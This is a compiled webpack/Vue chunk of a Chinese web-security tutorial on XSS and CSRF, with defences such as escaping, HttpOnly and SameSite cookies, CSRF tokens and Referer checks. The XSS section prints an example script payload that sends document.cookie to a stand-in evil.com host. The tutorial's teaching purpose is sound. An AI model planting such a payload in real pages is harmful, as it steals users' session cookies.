(window.webpackJsonp=window.webpackJsonp||[]).push([[17],{338:function(s,e,t){"use strict";t.r(e);var a=t(3),n=Object(a.a)({},function(){var s=this,e=s.$createElement,t=s._self._c||e;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"xss跨站脚本攻击-cross-site-script"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#xss跨站脚本攻击-cross-site-script","aria-hidden":"true"}},[s._v("#")]),s._v(" XSS跨站脚本攻击(Cross Site Script)")]),s._v(" "),t("p",[s._v("  外部脚本（用户输入的）被注入到受害网站，如果网站没有过滤，那这段脚本可能被之后的访问者执行。")]),s._v(" "),t("h3",{attrs:{id:"举例说明"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#举例说明","aria-hidden":"true"}},[s._v("#")]),s._v(" 举例说明")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("<script>window.open(www.evil.com?content=document.cookie);<\/script>\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("  我们不能相信用户的输入内容，要对其进行校验。现在主流框架Vue/React都实现了XSS的防御。")]),s._v(" "),t("h3",{attrs:{id:"防御措施"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#防御措施","aria-hidden":"true"}},[s._v("#")]),s._v(" 防御措施")]),s._v(" "),t("ol",[t("li",[s._v("特殊字符过滤，也就是内容进行转义（输入检查）")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("const decodingMap = {\n  '&lt;': '<',\n  '&gt;': '>',\n  '&quot;': '\"',\n  '&amp;': '&',\n  '&#10;': '\\n'\n}\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br")])]),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("function xss(str) {\n    var div = document.createElement('div');\n    var text = document.createTextNode(str)\n \n    div.appendChild(text)\n \n    var val = div.innerHTML;\n    text = null; div = null;\n \n    return val;\n}\nvar sss = xss('<div style=\"color:red;\" onclick=\"alert(2)\">haha</div>')\ndocument.body.innerHTML = sss\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br")])]),t("ol",{attrs:{start:"2"}},[t("li",[s._v("将重要的cookie标记为HttpOnly,这样JS中的document.cookie就不能获取到cookie了")])]),s._v(" "),t("h2",{attrs:{id:"csrf跨站请求伪造-cross-site-request-forgery"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#csrf跨站请求伪造-cross-site-request-forgery","aria-hidden":"true"}},[s._v("#")]),s._v(" CSRF跨站请求伪造(Cross Site Request Forgery)")]),s._v(" "),t("p",[s._v("  CSRF利用的是受害者本地Cookie来骗取服务器的信任，可以在受害者不知情的情况下，以受害者的名义去发送请求，攻击服务器。")]),s._v(" "),t("h3",{attrs:{id:"防御措施-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#防御措施-2","aria-hidden":"true"}},[s._v("#")]),s._v(" 防御措施")]),s._v(" "),t("ol",[t("li",[s._v("检查Referer字段，服务器端可以通过HTTP请求头中的Referer字段来判断访问来源是否合法；（不安全，Referer可被修改）")]),s._v(" "),t("li",[s._v("验证码(体验不好)")]),s._v(" "),t("li",[s._v("Token，服务端给用户一个Token，用户发送请求时，带上这个Token,服务端进行校验；（主流）")]),s._v(" "),t("li",[s._v("Samesite Cookie属性，Set-Cookie新增Samesite属性，设置成strict,这样就同站Cookie，第三方就使用不了Cookie了。")])])])},[],!1,null,null,null);e.default=n.exports}}]);